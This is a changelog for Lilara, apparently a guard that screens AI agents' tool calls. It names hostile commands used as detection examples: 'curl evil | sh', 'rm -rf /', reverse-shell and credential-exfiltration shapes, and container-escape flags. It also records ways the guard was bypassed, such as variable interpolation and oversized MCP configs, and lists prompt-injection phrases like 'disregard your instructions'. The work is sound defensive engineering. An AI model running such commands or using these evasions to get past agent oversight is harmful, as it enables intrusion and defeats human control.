# Changelog

All notable changes to Lilara (formerly Horus Agentic Power / Agent Runtime Guard) are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
Versions follow [Semantic Versioning](https://semver.org/).

---

## [Unreleased]

### Added

- **feat(universal-tool-coverage): F24 floor + file-write/MCP/WebFetch scoring (Cap 1)** — Closes the scoring gap where Edit/Write/MCP/WebFetch tool calls bypassed all numeric risk scoring. Three new scoring arms in `runtime/risk-score.js` (reads `ctx.ir.fileTargets[]`/`mcpServer`/`networkTargets[]` with flat-field fallback for replay): **file-write** (high-sensitivity paths +7, persistence paths +5, medium paths +3, CI/CD config +3, system paths +5, lockfiles +1); **MCP** (any `mcp__*` baseline +1, sensitive-path arg +4, medium-path arg +2); **network** (`http://` non-host +2, IP literal non-loopback +3, package-registry exempt, other https +1). New non-demotable hard floor **F24** (`credential-persistence-write`, rung 17.625) blocks Edit/Write to in-project execution-persistence paths (`.git/hooks/*`, cron, systemd, LaunchAgents, shell-rc) and high-sensitivity credential files (vault, private-key, payments, `.kube`, `.aws`); contract opt-out via `scopes.files.allow` glob list. **F4 extended** to scan MCP arg payloads (`JSON.stringify(tool_input)`) for class-C secrets — a GitHub PAT in `mcp__slack__post_message` args hard-blocks via F4. **F18 extended** to evaluate `ir.networkTargets` for native WebFetch calls (URL in `tool_input`, not just command string). New `classifyDeployTarget()` helper in `runtime/action-ir.js` (pure, zero IR-field impact — `irHash` unchanged for all existing entries). `runtime/decision-lattice.js` + `runtime/floor-codes.js` gain F24 entry. `schemas/lilara.contract.schema.json` gains `scopes.files.allow`. `tests/fixtures/file-write-floor/` adds 11 new `.input` fixtures; `scripts/run-fixtures.sh` and `scripts/lilara-cli.sh check` wired. 381 fixtures (+11 file-write-floor); fixture count bumped 370→381. `tests/eval-corpus.json` grows 98→110 entries (+12: dangerous-29/30/31, safe-47–52, borderline-25/26/27); eval harness attaches IR via `buildIr()` for all tool entries. FP 0.0% / FN 0.0%.

- **feat(dashboard): read-only observability dashboard (Cap 2)** — New `scripts/dashboard-server.js` (stdlib only: `http`/`fs`/`path`/`zlib`/`crypto`; passes `check-zero-deps.sh`). Binds `127.0.0.1`; port from `--port`/`LILARA_DASHBOARD_PORT` (default 7917). **Fail-closed**: loads `redactEntry` from `runtime/receipt-export.js` at startup; exits with code 1 if missing — never serves unredacted data. `readAllJournalEntries()` enumerates active `decision-journal.jsonl` + `.1.jsonl` + `.2/.3.jsonl.gz` (gunzipSync; skip-and-continue on any corrupt line/file), redacts every entry via the single `redactEntry` chokepoint. Routes: `GET /` (inline dark-theme HTML+vanilla JS, no CDN); `GET /healthz`; `GET /api/summary`; `GET /api/decisions?limit&action&level&floor&session&date`; `GET /api/coverage` (byToolKind Bash/file-write/MCP/network counts + F24 hits + new reason-code summary — surfaces the Cap 1 story); `GET /api/kill-chains`; `GET /api/sessions`. Five tab views: Overview, Decisions, Coverage, Kill Chains, Sessions. `scripts/receipt-export.js` promotes `_redactEntry`/`_readJournal` to stable public exports (`redactEntry`/`readJournal`; underscore aliases preserved). Launch: `bash scripts/lilara-cli.sh dashboard` or `LILARA_DASHBOARD_PORT=8080 node scripts/dashboard-server.js`.

- **test(dashboard): check-dashboard.sh smoke test** — `scripts/check-dashboard.sh` boots the server on an ephemeral port with a synthetic journal (one F24 block entry, one kill-chain entry, one entry with a raw GitHub PAT), then asserts 12 properties: `/healthz` 200; `GET /` 200 + `<title>Lilara Dashboard`; `/api/summary` valid JSON with `byAction`/`byLevel`/`total`; `/api/decisions` contains `[REDACTED:github-pat:...]` and no raw PAT; `/api/kill-chains` has ≥1 entry with `chainType`; `/api/coverage` has `byToolKind.file-write ≥ 1` and `f24Hits ≥ 1`. Wired into `lilara-cli.sh check` (Dashboard section). `EXPECTED_SCRIPTS` bumped 91→93.

- **docs(owasp): note Cap 1 universal tool coverage** — `references/owasp-agentic-coverage.md` ASI02 records `**Cap 1 (Universal Tool Coverage):**` (F24 floor + file-write scoring arms, MCP scoring, WebFetch network scoring). ASI04 records `**Cap 1 (F4 MCP arg scan):**` (F4 extended to scan `JSON.stringify(tool_input)` for class-C secrets in MCP calls) and `**Cap 1 (F18 WebFetch):**` (F18 evaluates `ir.networkTargets` for native WebFetch tool calls, not just command strings).

- **feat(mcp-security): F25 mcp-arg-danger floor, F26 mcp-registration-write floor, F4 MCP opt-out, rug-pull advisory, result-injection advisory** — Five MCP security additions:
  (1) **F25 (mcp-arg-danger, rung 17.65)**: non-demotable hard block when an MCP tool call's argument payload contains a dangerous-command-shaped string value (e.g. `{cmd:"rm -rf /"}`, `{exec:"curl evil | sh"}`); opt out via `scopes.mcp[server].policy=allow`. `runtime/decision-engine.js` `_evalMcpArgFloor()`.
  (2) **F26 (mcp-registration-write, rung 17.6875)**: non-demotable hard block on Edit/Write to MCP config paths (`.mcp.json`, `.claude/settings.json`, `codebase.mcp.json`) that register a server with a dangerous-command-shaped launch command; fires even when F16 ambient opt-out is active; `scopes.files.allow` can opt out. `runtime/decision-engine.js` `_evalMcpRegistrationFloor()`.
  (3) **F4 MCP opt-out**: `scopes.mcp[server].policy=allow` in a signed contract suppresses F4 secret scan for that server's tool calls — credential args are legitimate for trusted servers (DB connectors, secrets managers, etc.).
  (4) **Rug-pull / tool-drift** advisory: `runtime/mcp-pin.js` records a hash of each MCP tool's arg shape (key-set + coarse value-type classes, never raw values) and sets `result.mcpToolDrift=true` when the shape changes across calls; observe-only by default.
  (5) **MCP result-injection**: `claude/hooks/output-sanitizer.js` scans MCP tool results for class-C secrets; sets `result.mcpResultInjection=true` as a non-blocking advisory.

- **test(eval): align decision-replay.eval.js to forward toolInput → tool_input** — Fixes dangerous-31 FN (MCP Slack post with GitHub PAT was getting `warn` instead of `block` because `toolInput` was not forwarded). Now mirrors `eval-decision-quality.sh` line 126. `dangerous-31` is now correctly blocked by F4.

- **test(eval): add MCP arg-danger and safe-MCP corpus entries** — `tests/eval-corpus.json` grows 110→112 entries: `dangerous-32` (F25 mcp-arg-danger block), `safe-53` (benign MCP search FP control). FP 0.0% / FN 0.0%.

- **test(fixtures): add MCP security fixture sweep** — `scripts/check-mcp-security.sh` + 3 `.input` fixtures in `tests/fixtures/mcp-security/`: F25 arg-danger, F4 opt-out with `policy:allow` contract, benign MCP FP control. Inline rug-pull multi-call test. Wired into `scripts/run-fixtures.sh` and `scripts/lilara-cli.sh check`. 384 fixture files total (was 381); script count 93→94.

### Fixed

- **fix(mcp): F26 three-defect security hardening (Fix 1 + Fix 2 + Fix 3)** — Three boundary-condition fixes to the MCP security layer:
  (1) **Fix 1 — iterative cycle-safe `_extractStringValues` + require-review degrade**: replaced the recursive JSON-walk with an iterative stack+WeakSet walker capped at `_ESV_NODE_CAP` (1,000 nodes); cycle-safe; truncation returns `{ truncated: true }` which gates as `require-review` rather than silently allowing (fail-safe, not fail-open). Applied to both F25 (`_evalMcpArgFloor`) and F26 (`_evalMcpRegistrationFloor`). New adversarial tests T1–T3 in `tests/runtime/mcp-floor-adversarial.test.js`.
  (2) **Fix 2 — F26 raw-value fallback on non-strict JSON (JSONC/trailing-comma), sudo-anchor-safe**: `_evalMcpRegistrationFloor` previously returned `{ fire: false }` (fail-open) on any `JSON.parse` failure, leaving JSONC files (with `//` comments) and trailing-comma configs unscanned. Added a raw-value fallback path that extracts quoted string literals via regex and classifies each VALUE (not each line) — critical because `classifyCommand`'s sudo rule is `^\s*sudo`-anchored; a naive line-scan of `"command":"sudo apt-get install evilpkg"` starts with `"command"`, not `sudo`, so the anchor would miss. New fixtures `04-f26-jsonc-comment.input` and `05-f26-trailing-comma-sudo.input`; adversarial test T4 in `tests/runtime/mcp-floor-adversarial.test.js`. 386 fixture files total (was 384).
  (3) **Fix 3 — F26 fail-safe on oversize config (remove 100KB fail-open, add SCAN_CAP)**: `_evalMcpRegistrationFloor` had `if (!content || content.length > 100_000) return { fire: false }` — a `.mcp.json` padded past 100KB with a dangerous launch command evaded F26 entirely (proven attack: routes to allow). Removed the `> 100_000` bail-out; added a `SCAN_CAP = 262_144` (256KB) slice in the raw-value fallback path: content within SCAN_CAP scans normally; content exceeding SCAN_CAP is scanned up to the cap and, if no danger is found in the slice but content was truncated, returns `{ unscannable: true, reason: "oversize-mcp-config" }` (require-review gate — fail-safe, not fail-open). The structured JSON.parse path already handles oversized valid JSON correctly via the `_ESV_NODE_CAP` node cap (produces `{ unscannable: true, reason: "content-too-complex" }`). New adversarial tests T5 (oversize config with early danger → block) and T6 (benign clean config → allow, anti-FP guard) in `tests/runtime/mcp-floor-adversarial.test.js`.

- **test(runtime): add mcp-pin.test.js unit tests** — 9 assertions: `argShapeHash` (same-shape/type-change/key-change/null-sentinel) and `checkArgShapeDrift` (first-call/same-shape/type-change/fail-open). Wired into `scripts/check-runtime-core.sh`.

- **test(replay): add MCP security replay corpus** — `tests/fixtures/replay-corpus/build-mcp.js` + `mcp-security.jsonl` (4 entries: F25 block, F25 curl-pipe-sh block, benign allow, F4 PAT block). `check-replay-corpus.sh` passes with all 5 corpus files.

### Fixed

- **fix(universal-coverage): F24 and file-write scoring must gate on toolKind + skip ambient paths** — Two boundary conditions corrected: (1) `_evalCredPersistFloor` (F24) and the file-write scoring arm in `risk-score.js` must check `isFileWriteTool` (Edit/Write toolKind) before firing. Bash commands carry `targetPath` as project-scope metadata, not as a file being written; F24 on Bash `targetPath` incorrectly overrode the normal trust=strict explanation for commands like `sudo systemctl restart api` that happen to target a `vault/` directory. (2) Both F24 and the file-write scoring arm must skip paths classified as ambient by `isAmbientPath()` from `runtime/ambient.js`. F16 (rung 17.5) owns ambient paths (ssh, shell-rc, credentialHelper, etc.) — when an operator uses `scopes.ambient.allow` to opt in, the allowed path must not be re-blocked by F24 or re-scored by the file-write arm. Fixed: F16 fixture 08 (AWS credentials pathprefix opt-in → allow); F20 fixture (change-intent-drift blocked before rung 18.5 by `file-write-system-path` score); `check-config-integration.sh` strict trust posture explanation test.

---

## [0.1.5] — 2026-05-28

### Added

- **feat(risk-score): add docker-security container-escape pattern family** — `runtime/risk-score.js` gains eight docker-security pattern groups using the dual-path `matches()` helper (ADR-008 Unicode-bypass resistance): `docker-privileged-pattern` (+9; `docker/podman/nerdctl --privileged`), `docker-socket-mount-pattern` (+9; bind-mount of `docker.sock`/`containerd.sock`/`podman.sock`), `docker-host-mount-pattern` (+8; host `/`, `/etc`, `/root`, `/proc`, `/sys`, `/var/run` mounted in), `docker-cap-add-pattern` (+8; `--cap-add` of `ALL`, `SYS_ADMIN`, `SYS_PTRACE`, `SYS_MODULE`, `DAC_READ_SEARCH`), `docker-host-namespace-pattern` (+8; `--pid=host`, `--userns=host`), `container-namespace-escape-pattern` (+8; `nsenter` targeting PID 1), `docker-unconfined-pattern` (+6; `--security-opt seccomp|apparmor=unconfined`), `docker-host-network-pattern` (+3; `--net=host`). `claude/hooks/dangerous-patterns.json` gains matching static entries for dual-layer defense-in-depth (warn-mode stderr name + block-mode defense). `tests/eval-corpus.json` grows 82 → 98 entries (+7 dangerous block-class, +2 borderline warn-class, +7 safe controls). FP 0.0% / FN 0.0%, replay corpus 97/97 zero drift.

- **test(fixtures): add 11 docker-security dangerous-command-gate fixtures, bump fixture count 359→370** — Six warn fixtures (`dcg-docker-privileged`, `dcg-docker-socket-mount`, `dcg-docker-host-root-mount`, `dcg-docker-cap-sysadmin`, `dcg-docker-pid-host`, `dcg-nsenter-host`) and five enforce fixtures (`dcg-enforce-docker-privileged`, `dcg-enforce-docker-socket-mount`, `dcg-enforce-docker-host-root-mount`, `dcg-enforce-docker-cap-add-all`, `dcg-enforce-nsenter-host`). Fixture count bumped 359→370 in `scripts/check-counts.sh`, `README.md`, `references/full-power-status.md`, and this CHANGELOG. All 370 fixtures pass; `check-counts.sh` gate clean.

### Fixed

- **fix(action-ir): resolve file-target paths to platform-independent POSIX form** — `runtime/action-ir.js` gains a `_resolvePosix(cwd, p)` helper that uses `path.posix.normalize()` for absolute inputs (never injects a host drive letter) and forward-slash folding for relative inputs, producing output byte-identical to `path.resolve()` on Linux. Three `path.resolve()` call sites swapped: cwd normalization (~line 447), Edit/Read explicit `file_path` (~line 359), and shell command path resolution (~line 378). Root cause: `path.resolve('/data/old')` returns `C:\data\old` on Windows, diverging the `irHash` from the POSIX value stored in replay fixtures. `bash scripts/check-action-ir-parity.sh` now passes on Windows; replay corpus 97/97 zero drift confirms Linux byte-identity preserved. Completes the follow-up noted in fix(hardening) in v0.1.4.

### Changed

- **chore(check): wire `check-action-ir-parity.sh` into `lilara-cli.sh check`** — Added `section "Action IR parity"` block after the Cross-harness equivalence section in `scripts/lilara-cli.sh`. The parity check now runs as part of the standard `check` gate; requires the `fix(action-ir)` root-cause fix to pass on Windows.

- **docs(owasp): note ASI02 docker container-escape / privilege-escalation coverage** — Appended `**B4:**` clause to the ASI02 Coverage cell in `references/owasp-agentic-coverage.md` describing the docker-security pattern family (`--privileged`, docker socket bind-mount, host root/critical dir mount, escape-grade `--cap-add`, `--pid=host`/`--userns=host`, `nsenter` PID 1; plus warn-class `--security-opt unconfined` and `--net=host`). Added `runtime/risk-score.js` and `claude/hooks/dangerous-patterns.json` to the ASI02 File(s) column. `check-owasp-coverage.sh` passes with all cited files verified present.

---

## [0.1.4] — 2026-05-28

### Added

- **feat(risk-score): add 8 new detection patterns for critical threat coverage** — `runtime/risk-score.js` gains eight pattern groups, all using the dual-path `matches()` helper (ADR-008 Unicode-bypass resistance): `reverse-shell-pattern` (+9; `/dev/tcp/host/port` bash redirect, `nc -e /bin/sh`, `socat exec:/bin/bash` — the `/dev/tcp/` arm also catches data-out exfil), `authorized-keys-modification` (+7; `>>`/`>`/`tee` to `~/.ssh/authorized_keys`), `sensitive-file-network-exfil` (+8; `cat` of `/etc/passwd|shadow|sudoers`, `id_rsa`, `.aws/credentials`, `.env`, etc. piped to `curl|wget|nc|ncat|socat`), `env-exfil-pattern` (+7; `env`/`printenv`/`export -p` piped to a network tool), `persistence-crontab` (+5; `| crontab -` stdin install or `crontab <` heredoc), `shell-startup-modification` (+4; write/append to `~/.bashrc`/`~/.bash_profile`/`~/.zshrc`/`~/.profile` etc.), `suid-chmod-pattern` (+6; `chmod u+s`/`g+s`/`o+s` or 4-digit octal with leading `[4-7]`), and `interpreter-exec-system` (+5; `python|perl|node|ruby -c/-e` combined with `os.system`/`subprocess`/`child_process`/`execSync`/`popen` indicators). `tests/eval-corpus.json` grows 57 → 82 entries (+9 dangerous block-class, +6 borderline warn-class, +10 safe controls). No regressions: FP 0.0% (0/39), FN 0.0% (0/21), fixtures 370/370, replay corpus 97/97 with zero drift.

### Fixed

- **fix(hardening): wire adapter check scripts into the `check` body** — `scripts/lilara-cli.sh` now invokes `check-adapter-manifests.sh`, `check-antegravity-adapter.sh`, `check-codex-adapter.sh`, and `check-post-adapter-parity.sh` from the fast `check` loop (immediately after Cross-harness equivalence); all four pass cleanly on Windows. `check-action-ir-parity.sh` is intentionally not wired — its `rm-rf` scenario fails on Windows because the expected fixture IR uses POSIX-absolute paths while `path.resolve('/data/old')` resolves to `C:\data\old`; the other 5 scenarios pass byte-identical. Tracked for follow-up.

### Changed

- **docs(owasp): note new ASI01/ASI02/ASI04 coverage** — `references/owasp-agentic-coverage.md` records the new detections: ASI01 (A5) reverse-shell, interpreter shell-out, and sensitive-file-to-network exfil; ASI02 (B3) persistence vectors (`crontab -`, shell-init writes, setuid bit); ASI04 (A5) SSH backdoor, env-dump exfil, and sensitive-file-to-network exfil now scored at critical.

---

## [0.1.3] — 2026-05-27

### Added

- **fix(eval-corpus): recalibrate 4 entries + add eval state isolation** — `tests/eval-corpus.json`: `dangerous-04/05/06` block→warn (force-push routes to `escalate`, a warn-class action, under balanced posture); `borderline-11` warn→block (payloadClass C is hard-blocked by F4 floor). Engine behavior unchanged. `evals/decision-replay.eval.js`: adds `LILARA_STATE_DIR` isolation (isolated temp dir per run) so accumulated session trajectory-nudge from prior sessions cannot contaminate eval results. Result: 57/57 pass deterministically.

- **fix(secrets): secret-pattern coverage expanded** — `claude/hooks/secret-patterns.json` grows 23 → 26 entries. New patterns: GitLab personal access token (`glpat-…`), Google OAuth access token (`ya29.…`), Google API key (`AIzaSy…`). Extended in place: `database URI with password` regex now also covers `mongodb+srv://` SRV-discovery URIs; `private key block` regex now includes the `DSA` key type. `SendGrid API key` (stricter 3-segment regex) unchanged. Hooks-baseline regenerated.

- **chore(dogfood): wire Lilara into its own Claude Code session** — `lilara.config.json` added to repo root (`trustPosture: balanced`, `branches.protected: [master, main]`). `dangerous-command-gate.js`, `secret-warning.js`, and `output-sanitizer.js` wired via `.claude/settings.local.json` (gitignored; machine-local absolute paths). Lilara now guards its own development sessions.
- **docs(roadmap): post-v3.1 candidates pruned** — removed F15 manifest publication (resolved PR #56), OpenCode PostToolUse parity (resolved PR #57), and OpenClaw PostToolUse parity (resolved via all-6-harness ASI05 coverage). Codex live-E2E item narrowed to antegravity-only (Codex VERIFIED PR #60). ASI04 description updated to actual narrow gap: journal-level redaction covers only `targetPath`/`notes` fields; other fields not yet covered.

### Fixed

- **fix(taint): preserve Grep/Read/Glob F10 exemption when `lilara.config.json` omits `taint` section** — `runtime/project-policy.js` `normalizeRuntimeConfig` now seeds `taintSafeToolClasses` and `taintMinTokenLength` from `defaultPolicy()`, so the safe-tool-class defaults are not silently dropped when any `lilara.config.json` is present without a `taint` block. Root cause: the dogfood config (`lilara.config.json` added in `chore(dogfood)`) had no `taint` section, which caused `policy.taintSafeToolClasses` to be `undefined` → `Grep` lost its F10 exemption → `taint:d37-grep-safe-class-no-f10` CI failure on all platforms. No decision-engine behavior change.

- **fix(f3): close `${VAR}` variable-interpolation bypass** (marathon HIGH) — `r${x}m -rf /` and similar evasions bypassed F3 because the dangerous-pattern regexes tested the raw command. `runtime/command-normalize.js` now strips `${…}` markers before the ASCII fast-path; `runtime/pretool-gate.js` applies dual-path matching (raw ‖ normalised) at the hit site, mirroring the pattern in `risk-score.js`.

- **fix(f3): add dangerous-patterns for `find -delete` and `find -exec rm/shred`** (marathon HIGH) — `find / -delete` and `find . -exec rm {} +` have equivalent destructive blast radius to `rm -rf` but were absent from `claude/hooks/dangerous-patterns.json`. Two critical-severity entries added. Pattern count: 21 → 23.

- **fix(secrets): loosen GitHub fine-grained PAT length anchor from `{82}` to `{20,}`** (marathon MEDIUM) — The existing entry in `claude/hooks/secret-patterns.json` required exactly 82 chars after `github_pat_`, missing shorter redacted/test tokens. Pattern count unchanged at 26.

- **fix(f21): add CS-008 compaction-survival pattern for "disregard your instructions"** (marathon MEDIUM) — Phrase not caught by CS-001 or CS-002; added `/disregard\s+(your|the|all)\s+(instructions|rules|guidelines)/i` (severity high) to `runtime/compaction-survival.js`.

- **fix(f21): widen CS-005 to catch summarization/compression variants** (marathon MEDIUM) — CS-005 only matched `preserve (this|the following) through compaction`. Widened to also match `through|across|during` + `compaction|summarization|compression` with arbitrary words between anchor and trigger.

- **fix(test): repair change-intent `policy-edit-not-declared` test after rebrand** (marathon LOW) — The test fixture path was updated to `lilara.contract.json` during the Horus→Lilara rebrand, but `POLICY_PATH_PATTERNS` in `runtime/change-intent.js` still checks for `horus\.contract`. Reverted the test path to `horus.contract.json`; test intent preserved.

- **fix(fixtures): replay-corpus verified clean — no recalibration needed** (marathon LOW) — Marathon reported 1 of 369 fixtures failing; investigation on this branch confirms all 97 replay-corpus entries (corpus: 56, adversarial: 13, f16: 28) pass with zero drift. Root cause resolved in the prior rebrand corpus regeneration.

### Changed

- **feat(codex): verify hook protocol against openai/codex + promote adapter from EXPERIMENTAL to VERIFIED** — Source-traced PreToolUse / PostToolUse payload shapes against `codex-rs/hooks/src/events/` structs; snake_case confirmed via `codex-rs/hooks/src/types.rs:38`; exit-code protocol confirmed via public docs. `codex/hooks/adapter.js` extraction chain reordered to lead with verified upstream fields (`tool_input.command`, `cwd`). `codex/manifest.json` promoted: `verifiedAt: "2026-05-24"`, `argsFidelity: "exact"`, `cwdFidelity: "exact"`, `mcpInterception: "partial"`, `skillInterception: "partial"` (openai/codex#20204, #16732). All negativeCapabilities rewritten with `codex-rs/hooks/src/` file:line citations. `runtime/post-adapter-factory.js` extraction chain gains `tool_response` (verified Codex PostToolUse field). `scripts/check-codex-adapter.sh` adds checks 13–16 against the canonical payload shape. All codex/ docs rewritten from SPECULATIVE/EXPERIMENTAL to VERIFIED. Cross-cutting harness matrix, roadmap, apply-status, and OWASP coverage updated accordingly.

---

## [0.1.0] — 2026-05-24 — First Lilara release

Rebrand from Horus Agentic Power (HAP) v3.1.0. Clean break — see MIGRATION.md for operator runbook.
All prior versions documented under the HAP / Agent Runtime Guard name remain in this changelog as
historical lineage; Lilara starts at 0.1.0.

### Renamed

- Product: Horus Agentic Power (HAP) → **Lilara**
- CLI: `horus-cli.sh` → `lilara-cli.sh`; `horus-diff-decisions.sh` → `lilara-diff-decisions.sh`
- Env vars: `HORUS_*` → `LILARA_*` (clean break — no backward-compat aliases)
- State dir: `~/.horus/` → `~/.lilara/` (operators must `mv ~/.horus ~/.lilara`)
- Config/contract files + schemas: `horus.*` → `lilara.*`
- Contract ID prefix: `hap-` → `lilara-` (existing accepted contracts become invalid; re-acceptance required)
- GitHub repo: `agent-runtime-guard` → `lilara`

### Breaking

- No backward-compatibility shims. `HORUS_*` env vars are **not** read.
- Existing accepted contracts with `hap-` prefix require re-acceptance.
- Operators must migrate state: `mv ~/.horus ~/.lilara`

### Added

- `scripts/lilara-rebrand.sh` — the 6-phase mechanical rename script (kept as tooling artifact)
- `scripts/check-no-horus.sh` — permanent CI gate: fails if any stale HORUS/HAP brand token found
- `scripts/lilara-rebrand-history.sh` — the historical ECC→Horus rename script (frozen reference)
- **ADR-016 — Coachable Floors (v0.5 Stage E, wave-1).** Four zero-dep primitives that flip Lilara from a silent wall into a coachable, debuggable, testable wall. (1) **Typed block-codes** — new frozen registry `runtime/floor-codes.js` maps every floor's reasonCode / floorFired to a stable `F<n>_<SCREAMING_SNAKE>` code (e.g. `F8_PROTECTED_BRANCH`); `decision-engine.js` stamps `code` on every block receipt and journal entry; `schemas/receipt.v1.json` gains additive optional `code` (≤80 chars, `^F[0-9]+` pattern) and `coaching` ({`message`, `hint`}) fields; action enum extended with `"warn"`. (2) **Coaching envelopes** — new pure module `runtime/coaching.js` exports `buildCoachingEnvelope({manifest, coaching, hookEventName})`; adapters with `additionalContextSupported: true` (Claude, ClawCode) emit `hookSpecificOutput.additionalContext` on PreToolUse so the model receives coaching in its next turn; others fall back to `[lilara:coaching]` on stderr; `loadManifest()` in `claude/hooks/hook-utils.js` now projects `additionalContextSupported`; all six `*/manifest.json` files gain the flag (claude + clawcode = true; openclaw, opencode, codex, antegravity = false). (3) **F21 compaction-survival scanner** — new floor at lattice rung 18.7 (action: `"warn"`, non-demotable); `runtime/compaction-survival.js` exports `scanForInjection(text)` with 7 seeded patterns (CS-001..CS-007) scanning the first 64 KB; `runtime/post-adapter-factory.js` adds `"Read"` to `EXTERNAL_TOOLS`, extends `sourceLabel()`, and calls the scanner after taint record — on match appends an F21 receipt and emits `[lilara:coaching]` to stderr; `scripts/check-decision-replay.sh` gains an F21 fixture sweep. (4) **`lilara sandbox` dry-run CLI** — new subcommand calls `decide({dryRun: true})`, prints which floors fire (action, floorFired, code, rung, reasonCodes, riskScore, decisionSource); flags: `--json`, `--tool`, `--harness`, `--explain`; journal append skipped via `_earlyBlockDryRun` flag (threaded through both `buildEarlyBlock` and the main decide() path); belt-and-suspenders via `LILARA_DRY_RUN=1` env var. New tests: `tests/runtime/floor-codes.test.js` (7 cases), `tests/runtime/coaching-envelope.test.js` (14 cases), `tests/runtime/compaction-survival.test.js` (24 cases), `tests/runtime/sandbox-dry-run.test.js` (7 cases); 8 new fixtures under `tests/fixtures/compaction-survival/` (5 positive + 3 negative corpus). Fixture count moves from 351 to **359 fixtures**. New ADR: `references/adr-016-coachable-floors.md`. Zero new runtime dependency; zero floor-ordering change to existing floors; zero schema-breaking change.

- **Antegravity harness — VERIFIED against upstream google-gemini/gemini-cli source (Apache-2.0).** Promoted from EXPERIMENTAL to VERIFIED. Hook protocol traced end-to-end against `google-gemini/gemini-cli`: BeforeTool / AfterTool payload shapes confirmed via `packages/core/src/hooks/types.ts` (BeforeToolInput / AfterToolInput interfaces, snake_case, `cwd` in base payload, `tool_input.command`, `tool_response`). Decision protocol confirmed via `packages/core/src/hooks/hookRunner.ts` (exit 2 = deny; JSON stdout also parsed). Event-name / tool-name mapping confirmed via `packages/cli/src/commands/hooks/migrate.ts`. Critical finding: Antegravity uses **`BeforeTool` / `AfterTool`** (NOT `PreToolUse` / `PostToolUse`) and **`run_shell_command`** (NOT `Bash`); using the wrong names silently skips the hook — this was the cause of the prior "hooks don't fire" observation. Run `agy hooks migrate` to auto-convert a Claude Code config. `antegravity/manifest.json` `verifiedAt: "2026-05-24"`, `argsFidelity: "exact"`, `cwdFidelity: "exact"`, `pretoolBlocking: "supported"`, `posttoolObservation: "supported"`, `mcpInterception: "partial"`, `skillInterception: "none"`. New docs: `antegravity/WIRING_PLAN.md` (verified operator wiring guide with upstream source citations and migration trap), `antegravity/POSTTOOL_RESEARCH.md` (verified AfterTool payload shape), `antegravity/COMPATIBILITY_NOTES.md` (known/unknown table with upstream source appendix). `scripts/check-antegravity-adapter.sh` adds 4 new assertions (checks 13–16) covering the verified BeforeToolInput / AfterToolInput payload shapes. `README.md`, `ROADMAP.md`, `MODULES.md`, `scripts/check-harness-support.sh`, `scripts/generate-apply-status.sh`, `references/per-tool-apply-status.md`, and `references/owasp-agentic-coverage.md` updated to reflect promotion.

- **ClawCode harness — VERIFIED against ClawCode v0.1.3 source.** Promoted from EXPERIMENTAL to VERIFIED. Hook protocol traced end-to-end against `deepelementlab/clawcode` source: PreToolUse / PostToolUse stdin payload shapes captured from `clawcode/llm/agent.py:1313-1438`, permission-decision protocol from `clawcode/plugin/hooks.py:38-51` + `252-280`. ClawCode is a "minimal Claude Code compatible hook execution engine" (`clawcode/plugin/hooks.py:69`) with one critical behavioural difference: it parses STDOUT as JSON for the permission decision and IGNORES the exit code. The previous ARG ClawCode adapter exited 2 on block in enforce mode but ClawCode allowed the tool call anyway. Bug fixed via a new `harnessOutput: "permission-json"` option in `claude/hooks/hook-utils.js → createAdapter()`: when set, the adapter emits `{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"..."}}` on stdout on block (allow case emits `{}`), AND still exits 2 for cross-harness consistency. `clawcode/hooks/adapter.js` opts in. The other five adapters keep the default `harnessOutput: "echo"` (stdout = raw stdin) — no behaviour change for Claude / OpenCode / OpenClaw / Codex / Antegravity. New docs: `clawcode/WIRING_PLAN.md` (verified operator wiring guide with `file:line` citations), `clawcode/POSTTOOL_RESEARCH.md` (verified PostToolUse payload shape), `clawcode/COMPATIBILITY_NOTES.md` (known/unknown table). `clawcode/manifest.json` `verifiedAt: "2026-05-23"`, `harnessVersion: "v0.1.3"`, `pretoolBlocking: "supported"`, `posttoolObservation: "supported"`, `argsFidelity: "exact"`, `cwdFidelity: "opaque"` (ClawCode does not include cwd in the payload). MCP and Skill interception remain `unverified` pending end-to-end fire trace. `scripts/check-adapter-manifests.sh` rule #10 relaxed to accept `verifiedAt` as a `YYYY-MM-DD` string (was: null only) — the tripwire intent (no faked truthy values) is preserved by the regex check. `scripts/check-clawcode-adapter.sh` adds 4 new assertions covering the verified payload shape extraction and the permission-json output protocol (allow, block, kill-switch). `ROADMAP.md` and `references/owasp-agentic-coverage.md` updated to reflect ClawCode promotion.

### Changed

- **F15 manifest publication across all six adapters.** Resolves the five `TODO(F15/Task0.6)` markers in `{codex, clawcode, openclaw, opencode, antegravity}/hooks/post-adapter.js` and aligns Claude's `output-sanitizer.js` with the same pattern. Each PostToolUse adapter now sources `envelopeReporting` from its own `<harness>/manifest.json` at hook load (via `require(path.join(__dirname, "..", "manifest.json"))`) instead of carrying a hard-coded local constant. The published manifest becomes the single source of truth; the hook and the manifest cannot drift. If the manifest is unreadable at hook load (e.g. partial install), the adapter falls back to the conservative `envelopeReporting=false` default — never assumes more capability than the manifest declares. Behaviour change: none for installed setups today, since every manifest already declares the same value the previous local constant carried (Claude: true; others: false). Going forward, bumping a manifest's `envelopeReporting` to `true` automatically activates F15 envelope reporting on that harness without a parallel hook edit.

- `artifacts/hooks-baseline.sha256` regenerated for `claude/hooks/output-sanitizer.js` (the only file in the integrity baseline whose hash changed; the five non-Claude post-adapters live outside the Claude-hooks baseline scope).

### Documentation

- **OpenCode PostToolUse parity — documented wiring path.** `opencode/WIRING_PLAN.md` PostToolUse Parity section rewritten from "deferred" to "supported" with wiring guidance. The implementation has been in repo since A3 (`opencode/hooks/post-adapter.js` delegating to `runtime/post-adapter-factory.js`), and `references/owasp-agentic-coverage.md` ASI05 has marked OpenCode COVERED since then; the WIRING_PLAN was the last document still describing it as a "documented follow-up". Operators are now instructed to wire the post-adapter as a PostToolUse hook mirroring how the PreToolUse `adapter.js` is wired. Also fixed a stale cross-reference in `openclaw/WIRING_PLAN.md` (`opencode/hooks/output-sanitizer.js` → `opencode/hooks/post-adapter.js`).

---

## [3.1.0] — 2026-05-15

**Product milestone:** v0.5 "Incremental Hardened Daily" closed. Stages A–D delivered (PRs #37–#53). Master green across Ubuntu / macOS / Windows; all 30 local CI gates pass; 371 fixtures + 12 replay-corpus entries with 0 divergences; runtime p99 1.2ms (10ms ceiling); 13 hooks kill-switch clean. No schema-breaking change since 3.0.0 — every floor and every receipt field added in this window is additive.

### Added

